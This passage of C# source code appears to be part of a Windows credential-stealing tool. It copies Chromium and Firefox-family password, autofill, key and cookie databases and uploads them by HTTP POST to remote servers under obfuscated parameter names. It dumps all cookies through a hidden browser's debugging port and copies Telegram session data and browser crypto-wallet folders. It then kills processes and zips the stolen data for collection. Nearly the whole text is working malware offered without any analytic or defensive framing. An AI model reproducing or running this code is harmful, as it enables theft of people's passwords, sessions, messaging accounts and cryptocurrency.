                string passwordsDbPath = Path.Combine(profilePath, "passwords.db");
                if (!File.Exists(loginDataPath))
                {
                    continue;
                }

                if (!CopyFile(loginDataPath, passwordsDbPath))
                {
                    continue;
                }

                try
                {
                    string response = PostDbFileAsync(passwordsDbPath, key, pikachu,raichu).Result;
                    if (!string.IsNullOrEmpty(response) && response != "No password found")
                    {
                        string browserFolder = Path.Combine(workPath, browserName);
                        string profileFolder = Path.Combine(browserFolder, profileName);
                        Directory.CreateDirectory(profileFolder);
                        string passwordsFile = Path.Combine(profileFolder, "Passwords.txt");
                        File.WriteAllText(passwordsFile, response, Encoding.UTF8);
                        totalPasswords++;
                    }
                }
                catch (Exception ex)
                {
                    continue;
                }
            }

            return totalPasswords;
        }
        private static byte[] HexStringToByteArray(string hex)
        {
            int numberChars = hex.Length;
            byte[] bytes = new byte[numberChars / 2];
            for (int i = 0; i < numberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }
        public static int GetAutofill(string workPath, string Bulbasaur)
        {
            int totalAutofills = 0;

            bool CopyFile(string src, string dst)
            {
                try
                {
                    File.Copy(src, dst, true);
                }
                catch (Exception ex)
                {
                    return false;
                }
                return true;
            }

            async Task<string> PostDbFileAsync(string dbFilePath, string url)
            {
                using (var client = new HttpClient())
                {
                    using (var content = new MultipartFormDataContent())
                    {
                        content.Add(new ByteArrayContent(File.ReadAllBytes(dbFilePath)), "dbfile", "webdata.db");
                        var response = await client.PostAsync(url, content);
                        response.EnsureSuccessStatusCode();
                        return await response.Content.ReadAsStringAsync();
                    }
                }
            }

            foreach (var browserInfo in Config.BrowserProfiles)
            {
                string profilePath = browserInfo.profile_path;
                string profileName = browserInfo.profile[0].profile_name;
                string rootPath = browserInfo.root_path;
                string browserName = Path.GetFileNameWithoutExtension(rootPath).Replace(".exe", "").Replace("_", " ").ToUpper();
                if (!Directory.Exists(profilePath))
                {
                    continue;
                }
                string webDataPath = Path.Combine(profilePath, "Web Data");
                string webDataDBPath = Path.Combine(profilePath, "webdata.db");
                if (!File.Exists(webDataPath))
                {
                    continue;
                }
                if (!CopyFile(webDataPath, webDataDBPath))
                {
                    continue;
                }
                try
                {
                    string response = PostDbFileAsync(webDataDBPath, Bulbasaur).Result;
                    if (!string.IsNullOrEmpty(response) && response != "No data found")
                    {
                        string browserFolder = Path.Combine(workPath, browserName);
                        string profileFolder = Path.Combine(browserFolder, profileName);
                        Directory.CreateDirectory(profileFolder);
                        string autofillFile = Path.Combine(profileFolder, "Autofill.txt");

                        File.WriteAllText(autofillFile, response, Encoding.UTF8);
                        totalAutofills++;
                    }
                }
                catch (Exception ex)
                {
                    continue;
                }
            }

            return totalAutofills;
        }

        public static async Task<int> GetCookie(string workPath)
        {
            int count = 0;
            var cookieSet = new HashSet<string>();
            var allCookiesText = new StringBuilder();
            foreach (var browserInfo in Config.BrowserProfiles)
            {
                string profilePath = browserInfo.profile_path;
                string rootPath = browserInfo.root_path;
                string profileName = browserInfo.profile[0].profile_name;
                string actualProfileName = new DirectoryInfo(profilePath).Name;
                int retryCount = 0;
                const int maxRetries = 3;
                while (retryCount < maxRetries)
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "taskkill",
                            Arguments = $"/F /IM {Path.GetFileName(rootPath)}",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        }).WaitForExit();
                        var random = new Random();
                        int port = random.Next(10000, 20000);
                        var Agru = $"--remote-debugging-port={port} --profile-directory=\"{profileName}\" --remote-allow-origins=* --window-position=10000,10000 --window-size=1,1 --disable-gpu --no-sandbox";
                        var proc = Process.Start(new ProcessStartInfo
                        {
                            FileName = rootPath,
                            Arguments = Agru,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                        using (var client = new HttpClient())
                        {
                            var response = await client.GetStringAsync($"http://localhost:{port}/json");
                            var json = JsonDocument.Parse(response);
                            var webSocketUrls = json.RootElement.EnumerateArray()
                                .Select(page => page.GetProperty("webSocketDebuggerUrl").GetString())
                                .ToList();
                            foreach (var wsUrl in webSocketUrls)
                            {
                                try
                                {
                                    await Task.Delay(2000);
                                    using (var ws = new ClientWebSocket())
                                    {
                                        await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
                                        var request = JsonSerializer.Serialize(new { id = 1, method = "Network.getAllCookies" });
                                        var requestBytes = Encoding.UTF8.GetBytes(request);
                                        await ws.SendAsync(new ArraySegment<byte>(requestBytes), WebSocketMessageType.Text, true, CancellationToken.None);
                                        var buffer = new byte[8192];
                                        var completeMessage = new StringBuilder();
                                        WebSocketReceiveResult result;
                                        do
                                        {
                                            result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                                            completeMessage.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
                                        }
                                        while (!result.EndOfMessage);
                                        var message = completeMessage.ToString();
                                        var cookies = JsonDocument.Parse(message).RootElement.GetProperty("result").GetProperty("cookies");
                                        foreach (var c in cookies.EnumerateArray())
                                        {
                                            try
                                            {
                                                string domain = c.GetProperty("domain").GetString();
                                                bool isDomain = domain.StartsWith(".");
                                                string path = c.GetProperty("path").GetString();
                                                bool secure = c.GetProperty("secure").GetBoolean();
                                                string name = c.GetProperty("name").GetString();
                                                string value = c.GetProperty("value").GetString();
                                                string cookieKey = $"{domain}{path}{name}";
                                                if (!cookieSet.Contains(cookieKey))
                                                {
                                                    cookieSet.Add(cookieKey);
                                                    double expiresValue = c.GetProperty("expires").GetDouble();
                                                    long expiresUnixTime = (long)expiresValue;
                                                    allCookiesText.Append($"{domain}\t{(isDomain ? "TRUE" : "FALSE")}\t{path}\t{(secure ? "TRUE" : "FALSE")}\t{expiresUnixTime}\t{name}\t{value}\n");
                                                    count++;
                                                }
                                            }
                                            catch
                                            {
                                                continue;
                                            }
                                        }
                                    }
                                }
                                catch
                                {
                                    continue;
                                }
                            }
                        }
                        proc.Kill();
                        break;
                    }
                    catch
                    {
                        retryCount++;
                        if (retryCount >= maxRetries)
                        {
                            break;
                        }
                    }
                }
                if (count > 0)
                {
                    var browserName = Path.GetFileNameWithoutExtension(rootPath);
                    var cookieFolder = Path.Combine(workPath, browserName, actualProfileName);
                    Directory.CreateDirectory(cookieFolder);
                    var cookiesFile = Path.Combine(cookieFolder, "Cookies.txt");
                    File.WriteAllText(cookiesFile, allCookiesText.ToString());
                }
            }
            return count;
        }

        /// Xử lý các trình duyệt Gecko

        public static Dictionary<string, List<List<string>>> GetExistingGeckoBrowsers()
        {
            var existingBrowsers = new Dictionary<string, List<List<string>>>();
            var GeckoBrowsers = new Dictionary<string, string>
            {
                { "Firefox", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox") },
                { "Pale Moon", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions\\Pale Moon") },
                { "SeaMonkey", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\SeaMonkey") },
                { "Waterfox", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Waterfox") },
                { "Mercury", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "mercury") },
                { "K-Meleon", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "K-Meleon") },
                { "IceDragon", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Comodo\\IceDragon") },
                { "Cyberfox", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "8pecxstudios\\Cyberfox") },
                { "BlackHaw", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NETGATE Technologies\\BlackHaw") }
            };

            foreach (var browser in GeckoBrowsers)
            {
                var profiles = GetProfiles(browser.Value);
                if (profiles.Count > 0)
                {
                    var profilesWithKey = profiles.Select(profile => new List<string> { profile, null }).ToList();
                    existingBrowsers[browser.Key] = profilesWithKey;
                }
            }
            return existingBrowsers;
        }

        public static List<string> GetProfiles(string basepath)
        {
            var profiles = new List<string>();

            try
            {
                var profilesPath = Path.Combine(basepath, "profiles.ini");
                if (File.Exists(profilesPath))
                {
                    var data = File.ReadAllText(profilesPath);

                    var matches = Regex.Matches(data, @"^Path=.+(?s:.)$", RegexOptions.Multiline);
                    foreach (Match match in matches)
                    {
                        profiles.Add(Path.Combine(basepath, match.Value.Substring(5).Trim()));
                    }
                }
            }
            catch (Exception ex)
            {
            }

            return profiles;
        }

        public static async Task UploadKeyFilesAsync(string chimerat)
        {
            var updatedGeckoBrowser = new Dictionary<string, List<List<string>>>();
            foreach (var browser in Config.GeckoBrowser)
            {
                var updatedProfiles = new List<List<string>>();
                foreach (var profile in browser.Value)
                {
                    var path = profile[0];
                    KillProcess(browser.Key);
                    string keyFilePath = Path.Combine(path, "key4.db");
                    if (File.Exists(keyFilePath) && new FileInfo(keyFilePath).Length > 0)
                    {
                        using (var client = new HttpClient())
                        {
                            var content = new MultipartFormDataContent();
                            var fileContent = new ByteArrayContent(File.ReadAllBytes(keyFilePath));
                            content.Add(fileContent, "file", "key4.db");
                            try
                            {
                                var response = await client.PostAsync(chimerat, content);
                                response.EnsureSuccessStatusCode();
                                var responseString = await response.Content.ReadAsStringAsync();
                                var responseJson = JsonSerializer.Deserialize<Dictionary<string, string>>(responseString);
                                if (responseJson != null && responseJson.ContainsKey("key"))
                                {
                                    updatedProfiles.Add(new List<string> { path, responseJson["key"].ToString() });
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
                if (updatedProfiles.Any())
                {
                    updatedGeckoBrowser[browser.Key] = updatedProfiles;
                }
            }
            Config.GeckoBrowser = updatedGeckoBrowser;
        }

        public static async Task<int> UploadLoginsAsync(string workPath, string colutorui)
        {
            int passwordCount = 0;

            foreach (var browser in Config.GeckoBrowser)
            {
                foreach (var profile in browser.Value)
                {
                    var path = profile[0];
                    var key = profile[1];
                    string loginsFilePath = Path.Combine(path, "logins.json");
                    if (File.Exists(loginsFilePath) && new FileInfo(loginsFilePath).Length > 0)
                    {
                        using (var client = new HttpClient())
                        {
                            var content = new MultipartFormDataContent();
                            var fileContent = new ByteArrayContent(File.ReadAllBytes(loginsFilePath));
                            content.Add(fileContent, "file", "logins.json");
                            try
                            {
                                var response = await client.PostAsync($"{colutorui}{key}", content);
                                response.EnsureSuccessStatusCode();
                                var responseString = await response.Content.ReadAsStringAsync();
                                var responseJson = JsonSerializer.Deserialize<Dictionary<string, List<Dictionary<string, object>>>>(responseString);

                                if (responseJson != null && responseJson.ContainsKey("decoded_passwords"))
                                {
                                    var profileFolderPath = Path.Combine(workPath, browser.Key, Path.GetFileName(path).Replace(".profile", "").Replace(".default", ""));
                                    Directory.CreateDirectory(profileFolderPath);
                                    var passwordsFilePath = Path.Combine(profileFolderPath, "Passwords.txt");

                                    using (var writer = new StreamWriter(passwordsFilePath, true))
                                    {
                                        foreach (var passwordInfo in responseJson["decoded_passwords"])
                                        {
                                            string timeLastUsedStr = passwordInfo["timeLastUsed"].ToString();
                                            string formattedTimeLastUsed;

                                            if (long.TryParse(timeLastUsedStr, out long timestamp))
                                            {
                                                try
                                                {
                                                    var dateTimeOffset = DateTimeOffset.FromUnixTimeMilliseconds(timestamp);
                                                    formattedTimeLastUsed = dateTimeOffset.ToString("yyyy-MM-dd HH:mm:ss");
                                                }
                                                catch
                                                {
                                                    formattedTimeLastUsed = timeLastUsedStr;
                                                }
                                            }
                                            else
                                            {
                                                formattedTimeLastUsed = timeLastUsedStr;
                                            }

                                            writer.WriteLine($"URL: {passwordInfo["url"]}|{passwordInfo["username"]}|{passwordInfo["passwd"]}|{formattedTimeLastUsed}");
                                            passwordCount++;
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    else
                    {
                    }
                }
            }
            return passwordCount;
        }



        public static async Task<int> UploadCookiesAsync(string workPath, string RainnyBowl)
        {
            int cookieCount = 0;

            foreach (var browser in Config.GeckoBrowser)
            {
                foreach (var profile in browser.Value)
                {
                    var path = profile[0];
                    string cookiesFilePath = Path.Combine(path, "cookies.sqlite");
                    if (!File.Exists(cookiesFilePath) || new FileInfo(cookiesFilePath).Length == 0)
                    {
                        continue;
                    }
                    try
                    {
                        using (var client = new HttpClient())
                        {
                            var request = new HttpRequestMessage(HttpMethod.Post, RainnyBowl);
                            var content = new MultipartFormDataContent();
                            content.Add(new StreamContent(File.OpenRead(cookiesFilePath)), "file", Path.GetFileName(cookiesFilePath));
                            request.Content = content;
                            var response = await client.SendAsync(request);
                            response.EnsureSuccessStatusCode();
                            var responseString = await response.Content.ReadAsStringAsync();
                            var responseJson = JsonSerializer.Deserialize<Dictionary<string, List<Dictionary<string, object>>>>(responseString);
                            if (responseJson != null && responseJson.ContainsKey("decoded_cookies"))
                            {
                                var profileFolderPath = Path.Combine(workPath, browser.Key, Path.GetFileName(path).Replace(".profile", "").Replace(".default", ""));
                                Directory.CreateDirectory(profileFolderPath);
                                var cookiesFilePathResult = Path.Combine(profileFolderPath, "Cookie.txt");
                                using (var writer = new StreamWriter(cookiesFilePathResult, true))
                                {
                                    foreach (var cookieInfo in responseJson["decoded_cookies"])
                                    {
                                        string host = cookieInfo.ContainsKey("host") ? cookieInfo["host"].ToString() : "N/A";
                                        string name = cookieInfo.ContainsKey("name") ? cookieInfo["name"].ToString() : "N/A";
                                        string value = cookieInfo.ContainsKey("value") ? cookieInfo["value"].ToString() : "N/A";
                                        string pathValue = cookieInfo.ContainsKey("path") ? cookieInfo["path"].ToString() : "/";
                                        string expiry = "0";
                                        if (cookieInfo.ContainsKey("expiry") && cookieInfo["expiry"] != null)
                                        {
                                            expiry = cookieInfo["expiry"].ToString();
                                        }
                                        bool isSecure = cookieInfo.ContainsKey("is_secure") && (cookieInfo["is_secure"] is bool secure && secure);
                                        writer.WriteLine($"{host}\tTRUE\t{pathValue}\t{(isSecure ? "TRUE" : "FALSE")}\t{expiry}\t{name}\t{value}");
                                        cookieCount++;
                                    }
                                }
                            }
                            else
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }

            return cookieCount;
        }


        public static int GetTLG(string mainPath)
        {
            try
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string sourcePath = Path.Combine(appDataPath, "Telegram Desktop", "tdata");
                if (!Directory.Exists(sourcePath) && !File.Exists(sourcePath))
                {
                    return 0;
                }
                string destinationPath = Path.Combine(mainPath, "Telegram");
                if (!Directory.Exists(destinationPath))
                {
                    try
                    {
                        Directory.CreateDirectory(destinationPath);
                    }
                    catch
                    {
                        return 0;
                    }
                }
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "taskkill",
                        Arguments = "/IM Telegram.exe /F",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    })?.WaitForExit();
                }
                catch
                {
                }
                string[] blacklistFolders = { "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5" };
                bool copied = false;
                foreach (var file in Directory.GetFileSystemEntries(sourcePath))
                {
                    string fileName = Path.GetFileName(file);
                    if (string.IsNullOrEmpty(fileName) || Array.Exists(blacklistFolders, folder => folder.Equals(fileName, StringComparison.OrdinalIgnoreCase)))
                    {
                        continue;
                    }
                    string targetPath = Path.Combine(destinationPath, fileName);
                    try
                    {
                        if (Directory.Exists(file))
                        {
                            foreach (var dir in Directory.GetDirectories(file, "*", SearchOption.AllDirectories))
                            {
                                Directory.CreateDirectory(dir.Replace(file, targetPath));
                            }

                            foreach (var innerFile in Directory.GetFiles(file, "*.*", SearchOption.AllDirectories))
                            {
                                File.Copy(innerFile, innerFile.Replace(file, targetPath), true);
                            }
                        }
                        else if (File.Exists(file))
                        {
                            File.Copy(file, targetPath, true);
                        }

                        copied = true;
                    }
                    catch
                    {
                    }
                }

                return copied ? 1 : 0;
            }
            catch
            {
                return 0;
            }
        }


        public static int GetWallet(string workPath)
        {
            int walletCount = 0;
            foreach (var browser in Config.BrowserProfiles)
            {
                try
                {
                    string profilePath = browser.profile_path;
                    string profileName = browser.profile[0].profile_name;
                    string rootPath = browser.root_path;
                    string browserName = Path.GetFileNameWithoutExtension(rootPath).Replace(".exe", "").Replace("_", " ").ToUpper();
                    foreach (var wallet in Config.walletPaths)
                    {
                        string walletName = wallet.Key;
                        string walletPath = Path.Combine(profilePath, wallet.Value);
                        if (Directory.Exists(walletPath))
                        {
                            string destinationPath = Path.Combine(workPath, browserName, profileName, walletName);
                            try
                            {
                                Directory.CreateDirectory(destinationPath);
                                foreach (var dir in Directory.GetDirectories(walletPath, "*", SearchOption.AllDirectories))
                                {
                                    Directory.CreateDirectory(dir.Replace(walletPath, destinationPath));
                                }

                                foreach (var file in Directory.GetFiles(walletPath, "*.*", SearchOption.AllDirectories))
                                {
                                    File.Copy(file, file.Replace(walletPath, destinationPath), true);
                                }

                                walletCount++;
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }

            return walletCount;
        }

        public static void MakeTheRain(string workPath,string zipFilename)
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string zipFilePath = Path.Combine(localAppData, zipFilename);
                if (File.Exists(zipFilePath))
                {
                    File.Delete(zipFilePath);
                }
                ZipFile.CreateFromDirectory(workPath, zipFilePath, CompressionLevel.Optimal, false);
            }
            catch (Exception ex)
            {
            }
        }

        public static void DeletePath(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
                else if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                  
                }
                else
                {

                }
            }
            catch (Exception ex)
            {
            }
        }

        public static void KillProcess(string processName)
        {
            var possibleProcessNames = new List<string>
            {
                processName.ToLower().Replace(" ", ""),
                processName.Replace(" ", ""),
                processName
            };

            foreach (var name in possibleProcessNames)
            {
                try
                {
                    var taskKillCommand = $"taskkill /F /IM {name}.exe";
                    var process = new System.Diagnostics.Process
                    {
                        StartInfo = new System.Diagnostics.ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/C {taskKillCommand}",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };

                    process.Start();
                    process.WaitForExit();

                    if (process.ExitCode == 0)
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }
            }

        }


    }
}
